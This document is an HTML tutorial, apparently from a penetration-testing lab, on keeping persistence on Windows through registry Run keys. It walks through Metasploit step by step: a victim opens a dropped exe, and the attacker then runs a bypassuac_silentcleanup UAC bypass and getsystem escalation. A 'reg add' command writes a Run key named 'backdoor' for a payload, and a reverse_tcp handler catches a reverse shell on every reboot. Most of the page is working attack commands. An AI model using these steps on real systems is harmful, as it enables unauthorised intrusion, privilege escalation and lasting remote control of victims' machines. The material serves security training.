<h1>Maintain Persistence by Modifying Registry Run Keys</h1>
<p>Registry keys labeled as <b>Run</b> and <b>RunOnce</b> are crafted to automatically run programs upon each user login to the system. The command line specified 
  as a key's data value is restricted to 260 characters or fewer. If attackers discover a service connected to a registry key with full permissions, 
  they can execute persistence attacks or exploit privilege escalation. Upon any authorized user's login attempt, the associated service link within the 
  registry triggers automatically.</p>

  <h2>Remote Shell Workflow</h2>
<p>Follow the <a href=remote_shell_workflow1.html><b>remote shell workflow</b></a> to create an exploit and store it in /var/www/html/share</p>
<p>Create two exe files for exploits, one exploit for port 444 and named Test.exe and one exploit for port 4444 named registry.exe</p>
<p>As soon as the victim downloads and opens the Test.exe exploit, a meterpreter session will open</p>
<p><ol>
  <ul>sysinfo</ul>
  <ul>getuid</ul>
  <ul>background</ul>
</ol>
<p>Note: to return to the active session when it is running in background is:</p>
<p><ol>
 <ul>sessions -i* -> show active background sessions</ul>
 <ul>sessions -i 1 -> return to the first background session</ul>
</ol>
<p>The meterpreter session is running on the background. Now, type <b>search bypassuac</b> to get the list of bypassuac modules. 
   use exploit/windows/local/bypassuac_silentcleanup</p>
<p><ol>
  <ul>use exploit/windows/local/bypassuac_silentcleanup</ul>
  <ul>set session 1</ul>
  <ul>show options</ul>
 <ul>set lhost 10.10.1.13</ul>
 <ul>set target 0</ul>
 <ul>exploit</ul>
</ol></p>
<p>The exploit will bypass the UAC setting on the Windows machine.</p>
<p><ol>
  <ul>getsystem -t 1</ul>
  <ul>getuid -> the meterpreter session is now running with system privileges</ul>
  <ul>shell</ul>
</ol></p>
<p>The procedure above will NOT always work, depending of the fact if the OS on the target system is vulnerable or not. Some versions of Windows with some versions 
of patches and service packs are simply NOT vulnerable and the procedure will fail. If the elevation process fails, try if you can use SHELL etc. anyway.</p>
<p>In the elevated shell, type <b>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"</b> 
  and press Enter. Once the command is successfully executed, open another terminal window with root privileges and run <b>msfconsole</b> command.</p>
<p><ol>
  <ul>use exploit/multi/handler</ul>
  <ul>set payload windows/meterpreter/reverse_tcp</ul>
  <ul>set lhost 10.10.1.13</ul>
  <ul>set lport 4444</ul>
  <ul>exploit</ul>
</ol></p>

<p>Restart the Windows machine so that the malicious file that is placed in the Run Registry is executed.</p>
<p>It takes some time for the Meterpreter session to open after the start of the Windows machine.
Whenever the Admin restarts the system, a reverse shell is opened to the attacker until the payload is detected by the administrator.</p>
